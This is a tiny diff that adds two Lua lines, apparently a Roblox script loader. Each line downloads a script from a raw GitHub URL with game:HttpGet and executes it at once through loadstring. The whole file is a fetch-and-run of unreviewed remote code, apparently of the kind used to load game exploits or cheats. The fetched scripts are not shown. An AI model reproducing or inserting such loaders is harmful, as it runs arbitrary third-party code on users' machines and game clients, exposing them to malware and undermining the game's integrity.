@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imcoolyet1990/wow/main/sc1"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imcoolyet1990/wow/main/sc2"))()
